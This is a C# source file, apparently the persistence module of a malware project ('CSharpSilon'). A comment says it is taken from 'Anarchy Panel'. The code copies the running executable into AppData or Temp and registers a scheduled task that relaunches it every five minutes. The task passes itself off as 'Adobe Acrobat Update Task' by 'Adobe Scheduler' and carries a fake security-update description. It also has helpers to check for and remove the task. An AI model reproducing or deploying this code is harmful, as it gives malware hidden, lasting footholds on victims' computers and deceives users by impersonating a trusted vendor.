using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using Microsoft.Win32.TaskScheduler;

namespace CSharpSilon.Utils
{
    public class schtasks
    {
        // Grabbed This From Anarchy Panel's Source <3
        public static string Author = "Adobe Scheduler";
        public static string Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
        public static string Task = "Adobe Acrobat Update Task";


        public static void HandleStartup()
        {
            string curproc = Process.GetCurrentProcess().ProcessName + ".exe";
            string appdata = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                curproc);
            string temppath = Path.Combine(Path.GetTempPath(), curproc);
            string path = "";

            try
            {
                if (Process.GetCurrentProcess().MainModule.FileName != appdata)
                {
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, appdata, true);
                }

                path = appdata;
            }
            catch (Exception e)
            {
                if (Process.GetCurrentProcess().MainModule.FileName != temppath)
                {
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, temppath, true);
                }
                path = temppath;
            }

            TaskService taskService = new TaskService();
            TaskDefinition taskDefinition = taskService.NewTask();
            taskDefinition.RegistrationInfo.Description = Description;
            taskDefinition.RegistrationInfo.Author = Author;
            TimeTrigger timeTrigger = new TimeTrigger();
            timeTrigger.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
            timeTrigger.Repetition.Interval = TimeSpan.FromMinutes(5.0);
            taskDefinition.Triggers.Add<TimeTrigger>(timeTrigger);
            taskDefinition.Settings.DisallowStartIfOnBatteries = false;
            taskDefinition.Settings.RunOnlyIfNetworkAvailable = true;
            taskDefinition.Settings.RunOnlyIfIdle = false;
            taskDefinition.Settings.DisallowStartIfOnBatteries = false;
            taskDefinition.Actions.Add<ExecAction>(new ExecAction(path, "", null));
            taskService.RootFolder.RegisterTaskDefinition(Task, taskDefinition);
            

        }
        
        public static void DelStartup()
        {
            try
            {
                using (TaskService taskService = new TaskService())
                {
                    taskService.RootFolder.DeleteTask(Task, false);
                }
            }
            catch (Exception ex) { }
        }
        
        public static bool GetStartup()
        {
            bool InStartup;
            try
            {
                TaskCollection tasks;
                using (TaskService taskService = new TaskService())
                {
                    tasks = taskService.RootFolder.GetTasks(new Regex(Task));
                }
                if (tasks.Count != 0)
                {
                    InStartup = true;
                }
                else
                {
                    InStartup = false;
                }
            }
            catch { InStartup = false; }
            return InStartup;
        }
        
    }
}